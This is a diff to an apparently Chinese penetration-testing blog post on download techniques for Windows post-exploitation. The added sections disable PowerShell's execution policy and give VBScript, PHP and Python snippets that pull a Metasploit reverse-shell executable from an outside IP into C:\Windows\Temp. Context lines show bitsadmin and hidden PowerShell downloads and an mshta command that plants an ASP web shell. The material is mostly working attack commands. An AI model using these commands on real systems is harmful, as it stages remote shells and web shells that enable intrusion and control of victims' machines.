@@ -148,6 +148,10 @@ bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.
 
 <h3 id="0x02-powershell下载文件">0x02 powershell下载文件</h3>
 
+<p>有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</p>
+
+<p>C:&gt;powershell set-executionpolicy unrestricted</p>
+
 <pre><code class="language-bash">powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.123.123/a.exe&quot;,&quot;C:\Windows\Temp\a.exe&quot;)
 
 #-w hidden 下载后终端自动退出
@@ -196,6 +200,52 @@ demo
 <pre><code>mshta vbscript:createobject(&quot;scripting.filesystemobject&quot;).createtextfile(&quot;a.asp&quot;,2,ture).writeline(&quot;&lt;%execute(request('l'))%&gt;&quot;)(window.close)
 </code></pre>
 
+<h3 id="0x04-visual-basic">0x04 Visual Basic</h3>
+
+<pre><code>Set args = Wscript.Arguments
+Url = &quot;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&quot;
+dim xHttp: Set xHttp = createobject(&quot;Msxml2.ServerXMLHTTP.3.0&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot;C:\Windows\Temp\aa.exe&quot;, 2 '
+end with
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; cscript test.vbs</p>
+
+<h3 id="0x05-利用脚本语言">0x05 利用脚本语言</h3>
+
+<ul>
+<li>PHP</li>
+</ul>
+
+<pre><code>#!/usr/bin/php
+&lt;?php
+    $data = file_get_contents(&quot;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&quot;);
+    file_put_contents('C:\\Windows\\Temp\\aa.exe',$data);
+?&gt;
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; php aa.php</p>
+
+<ul>
+<li>Python</li>
+</ul>
+
+<pre><code>import urllib2;u = urllib2.urlopen('http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; python aa.py</p>
+
+<h3 id="0x06-ftp">0x06 FTP</h3>
+
+<p>远程连接自己的ftp服务器，然后下载文件</p>
+
 <p><br /></p>
 
 <h4 id="reference-侵删">Reference(侵删)：</h4>
@@ -204,6 +254,7 @@ demo
 <li><a href="https://xianzhi.aliyun.com/forum/topic/1654?_blank">https://xianzhi.aliyun.com/forum/topic/1654</a></li>
 <li><a href="https://evi1cg.me/archives/Tricks.html?_blank">https://evi1cg.me/archives/Tricks.html</a></li>
 <li><a href="https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/?_blank">https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/</a></li>
+<li><a href="http://www.secange.com/2017/08/收集整理的16种文件下载的方式/?_blank">http://www.secange.com/2017/08/收集整理的16种文件下载的方式/</a></li>
 </ul>
 
                 
